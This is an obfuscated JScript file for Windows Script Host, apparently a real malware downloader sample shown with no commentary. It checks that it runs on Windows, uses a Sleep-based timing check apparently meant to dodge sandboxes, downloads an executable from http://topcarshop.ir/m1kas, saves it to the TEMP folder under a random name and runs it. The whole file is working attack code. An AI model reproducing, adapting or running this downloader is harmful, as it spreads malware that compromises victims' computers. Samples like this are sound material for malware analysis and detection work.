var _RA = false;
var _QD = "CreateObject";
var _BY = function _K() {return WScript[_QD]("WScript"+".Shell");}(), _R = 11;
var _VB = "MSXML2.XMLHTTP";
var _AL = 2123213;
var _Y = 0;
function _XL(_II){_BY["Run"](_II, _Y, _Y);};
function _PZ(){return _VB + "";};
function _L(_FN, _J){_Y = _Y * 1; return _FN - _J;};
function _TC(){return _QD;};
/*@cc_on
  @if (@_win32 || @_win64)
    _RA = true;
  @end
@*/
if (_RA)
{
var _F = "";
function _BV(){return 22;};
var _AE = 0; var _P0 = 0;
function _CX()
{
var _SZ = new this["Date"]();
var _Y0 = _SZ["getUTCMilliseconds"]();
WScript["Sleep"](_BV());
var _SZ = new this["Date"]();
var _H = _SZ["getUTCMilliseconds"]();
WScript["Sleep"](_BV());
var _SZ = new this["Date"]();
var _YZ = _SZ["getUTCMilliseconds"]();
var _AE = "_PR";
_AE = _L(_H, _Y0);
var _P0 = "_L0";
_P0 = _L(_YZ, _H);
_F = "open";
return _L(_AE, _P0);
}
var _FX = false;
var _E = false;
for (var _FO = _Y; _FO < _BV() * 1; _FO++){if (_CX() != _Y){
_FX = true; 
_P0 = "31" + 11 * _AE + _P0; 
_E = true; 
break;
}}
function _W() {return ((_FX == true) && (_FX == _E)) ? 1 : _Y;};
if (_FX && _W() && _E){
function _PB() {return _BY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "xib8uc2CNJGzSoBI.ex" + "e";};
 _O0 = _PZ();
 _K0 = WScript[_QD](_O0);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_K0[_F]("GET", "http://topcarshop.ir/m1kas", false);
		_K0["send"]();
		_FF = "Sleep";
	}
	WScript[_FF](_BV() + 120); 
	if (_K0["readystate"] < 2 * 2) continue;
	_P = _Y;
	function _O(_N) {var _IU = (1, 2, 3, 4, 5, _N); return _IU;};
	_UE = WScript[_TC()]("ADODB.Stream");
	_O0 = _UE;
	_O0[_F]();
	_O0["type"] = _O(1);
	_O0["write"](_K0["ResponseBody"]);
	_UE["position"] = _O(_Y);
	_O0["Save" + "ToFile"](_PB(), 2);
	_UE["cl"+"ose"]();
	_Z = _PB();
	_XL(_Z);
} catch(_UX){};
}
}
}

